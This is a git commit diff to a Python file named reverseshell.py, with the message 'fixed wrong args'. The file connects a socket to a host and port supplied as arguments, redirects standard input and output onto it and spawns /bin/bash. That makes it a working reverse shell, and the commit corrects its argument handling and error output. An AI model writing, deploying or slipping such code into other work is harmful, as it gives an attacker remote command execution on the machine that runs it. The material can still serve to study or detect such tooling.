f2c50b3eeae4dabaca08ecbba1980527237d61ae
jeijii <t.jingzhi1@gmail.com>
2019-01-19 13:16:01 +0000

    fixed wrong args

--- boot/reverseshell.py
+++ boot/reverseshell.py
@@ -4,14 +4,17 @@ import sys
 
 
 def main(arg):
+    print(arg[1])
+    print(arg[2])
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((arg[0], arg[1]))
+        s.connect((arg[1], int(arg[2])))
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
         pty.spawn("/bin/bash")
-    except:
+    except Exception as e:
+	print(e)
         print("Could not connect to server")
 
 
